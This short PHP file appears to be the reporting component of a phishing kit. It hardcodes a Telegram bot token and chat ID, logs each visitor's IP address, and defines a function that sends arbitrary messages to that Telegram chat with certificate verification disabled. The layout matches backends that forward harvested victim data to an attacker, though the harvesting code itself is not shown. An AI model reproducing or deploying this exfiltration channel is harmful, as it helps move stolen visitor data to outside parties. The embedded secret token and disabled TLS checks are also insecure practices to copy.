<?php


$token = "8642922604:AAFmcv8SIPXNwVHYSinpd4gfCQLCABGA5ng";
$id = "1293548758";

 
$ipp = "";
if($_SERVER['REMOTE_ADDR']=="::1"){
$ipp = "127.0.0.1";
}else{
$ipp = $_SERVER['REMOTE_ADDR'];
}


function call($msg){
    global $token;
    global $id;
    global $panel_link;

    $c = curl_init('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$id.
    '&text='.urlencode($msg));

    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}







?>